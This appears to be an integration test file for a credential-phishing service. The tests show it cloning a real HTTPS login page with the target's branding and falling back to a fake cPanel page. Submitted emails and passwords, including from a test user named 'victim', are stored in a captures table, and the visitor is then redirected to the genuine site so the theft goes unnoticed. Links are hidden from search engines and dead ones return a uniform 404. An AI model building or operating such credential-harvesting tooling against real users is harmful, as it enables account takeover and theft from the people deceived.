import { describe, expect, it } from "vitest";
import { NOT_FOUND_BODY } from "@chameleon/contracts";
import { admin } from "../../../packages/db/test/helpers";
import {
  BASE,
  activate,
  createService,
  signUp,
  verify,
  type Agent,
  type SignedUp,
} from "./harness";

async function ready(): Promise<{ who: SignedUp; serviceId: string }> {
  const who = await signUp();
  await verify(who.jar, who.email);
  const serviceId = await createService(who.jar, "pro");
  expect((await activate(who.jar, serviceId)).status).toBe(303);
  return { who, serviceId };
}

async function previewOf(
  serviceId: string,
): Promise<{ key: string; slug: string; id: string }> {
  const row = await admin.query<{ preview_key: string; slug: string; id: string }>(
    `select s.preview_key, l.slug, l.id
       from services s join links l on l.service_id = s.id and l.is_preview
      where s.id = $1`,
    [serviceId],
  );
  const found = row.rows[0];
  if (!found) throw new Error("no preview link");
  return { key: found.preview_key, slug: found.slug, id: found.id };
}

const clone = (jar: Agent, serviceId: string, url: string) =>
  jar.postJson(`/api/services/${serviceId}/clone`, { url });

describe("preview links (ADR 0033)", () => {
  it("mints exactly one free preview and leaves the link counter alone", async () => {
    const { serviceId } = await ready();
    const rows = await admin.query<{ id: string; hostname_id: string | null }>(
      "select id, hostname_id from links where service_id = $1 and is_preview",
      [serviceId],
    );
    expect(rows.rowCount).toBe(1);
    expect(rows.rows[0]!.hostname_id).toBeNull();

    const used = await admin.query<{ link_slots_used: number; link_cap: number }>(
      `select s.link_slots_used, t.link_cap from services s join tiers t on t.id = s.tier_id
        where s.id = $1`,
      [serviceId],
    );
    expect(used.rows[0]!.link_slots_used).toBe(0);
    expect(used.rows[0]!.link_cap).toBeGreaterThan(0);
  });

  it("serves the preview before any DNS exists", async () => {
    const { serviceId } = await ready();
    const preview = await previewOf(serviceId);

    const res = await fetch(`${BASE}/p/${preview.key}/${preview.slug}`);
    expect(res.status).toBe(200);
    expect(res.headers.get("x-robots-tag")).toBe("noindex");
    const html = await res.text();
    expect(html).toContain(`action="/p/${preview.key}/${preview.slug}"`);
    expect(html).toContain('type="password"');
    expect(html).not.toContain("one-time-code");
  });

  it("returns the constant 404 for an unknown key or slug", async () => {
    const { serviceId } = await ready();
    const preview = await previewOf(serviceId);

    const wrongKey = await fetch(`${BASE}/p/nope/${preview.slug}`);
    expect(wrongKey.status).toBe(404);
    expect(await wrongKey.text()).toBe(NOT_FOUND_BODY);

    const wrongSlug = await fetch(`${BASE}/p/${preview.key}/ZZZZZ`);
    expect(wrongSlug.status).toBe(404);
    expect(await wrongSlug.text()).toBe(NOT_FOUND_BODY);
  });

  it("clones a real page shape and renders its brand", async () => {
    const { who, serviceId } = await ready();
    const preview = await previewOf(serviceId);

    const made = await clone(who.jar, serviceId, "https://acme.example.test/login");
    expect(made.status).toBe(201);
    const body = (await made.json()) as { id: string };

    const html = await (await fetch(`${BASE}/p/${preview.key}/${preview.slug}`)).text();
    expect(html).toContain("Acme Sign In");
    expect(html).toContain("#0a5c36");
    expect(html).toContain("/a/");
    expect(html).toContain("Sign in to Acme");

    const pointed = await admin.query<{ profile_id: string }>(
      "select profile_id from links where id = $1",
      [preview.id],
    );
    expect(pointed.rows[0]!.profile_id).toBe(body.id);
  });

  it("falls back to cPanel when the clone is rejected", async () => {
    const { who, serviceId } = await ready();
    const preview = await previewOf(serviceId);
    await clone(who.jar, serviceId, "https://acme.example.test/login");
    const html = await (await fetch(`${BASE}/p/${preview.key}/${preview.slug}`)).text();
    expect(html).toContain("Acme Sign In");

    await admin.query("update profiles set status = 'rejected' where service_id = $1", [
      serviceId,
    ]);
    const after = await (await fetch(`${BASE}/p/${preview.key}/${preview.slug}`)).text();
    expect(after).toContain("<title>cPanel</title>");
  });

  it("refuses a clone target that is not https or has no password field", async () => {
    const { who, serviceId } = await ready();
    const bad = await clone(who.jar, serviceId, "http://acme.example.test/login");
    expect(bad.status).toBe(422);
    expect(((await bad.json()) as { error: string }).error).toBe("bad_url");
  });

  it("stores a credential and redirects to the real action", async () => {
    const { who, serviceId } = await ready();
    const preview = await previewOf(serviceId);
    await clone(who.jar, serviceId, "https://acme.example.test/login");

    const res = await fetch(`${BASE}/p/${preview.key}/${preview.slug}`, {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        step: "2",
        email: "victim@acme.test",
        password: "s3cret",
      }),
      redirect: "manual",
    });
    expect(res.status).toBe(303);
    expect(res.headers.get("location")).toBe("https://acme.example.test/session");

    const rows = await admin.query<{ fields: { username: string; password: string } }>(
      "select fields from captures where service_id = $1",
      [serviceId],
    );
    expect(rows.rowCount).toBe(1);
    expect(rows.rows[0]!.fields.password).toBe("s3cret");
  });

  it("dedupes a repeat submit inside the 15-minute bucket", async () => {
    const { who, serviceId } = await ready();
    const preview = await previewOf(serviceId);
    await clone(who.jar, serviceId, "https://acme.example.test/login");
    const submit = () =>
      fetch(`${BASE}/p/${preview.key}/${preview.slug}`, {
        method: "POST",
        headers: { "content-type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({ step: "2", email: "dupe@acme.test", password: "x" }),
        redirect: "manual",
      });
    expect((await submit()).status).toBe(303);
    expect((await submit()).status).toBe(303);
    const rows = await admin.query("select id from captures where service_id = $1", [
      serviceId,
    ]);
    expect(rows.rowCount).toBe(1);
    const suppressed = await admin.query<{ n: number }>(
      "select count(*)::int as n from captures_suppressed where service_id = $1",
      [serviceId],
    );
    expect(suppressed.rows[0]!.n).toBe(1);
  });

  it("renders the email step of a two-step clone", async () => {
    const { who, serviceId } = await ready();
    const preview = await previewOf(serviceId);
    await clone(who.jar, serviceId, "https://acme.example.test/login");

    const res = await fetch(`${BASE}/p/${preview.key}/${preview.slug}`, {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ email: "two@acme.test" }),
      redirect: "manual",
    });
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain('type="password"');
    expect(html).toContain('name="email" value="two@acme.test"');
    expect(html).not.toContain('type="email"');
    expect(html).not.toContain("one-time-code");
  });

  it("404s once the service leaves the live states", async () => {
    const { serviceId } = await ready();
    const preview = await previewOf(serviceId);
    await admin.query("update services set status = 'archived' where id = $1", [
      serviceId,
    ]);
    const res = await fetch(`${BASE}/p/${preview.key}/${preview.slug}`);
    expect(res.status).toBe(404);
    expect(await res.text()).toBe(NOT_FOUND_BODY);
  });

  it("404s a paused preview", async () => {
    const { serviceId } = await ready();
    const preview = await previewOf(serviceId);
    await admin.query("update links set status = 'paused' where id = $1", [preview.id]);
    expect((await fetch(`${BASE}/p/${preview.key}/${preview.slug}`)).status).toBe(404);
  });

  it("needs the owner to clone", async () => {
    const { who, serviceId } = await ready();
    // Demote the only member, then clone.
    await admin.query("update memberships set role = 'member' where org_id = $1", [
      who.orgId,
    ]);
    const res = await clone(who.jar, serviceId, "https://acme.example.test/login");
    expect(res.status).toBe(403);
    expect(((await res.json()) as { error: string }).error).toBe("owner_only");
  });
});
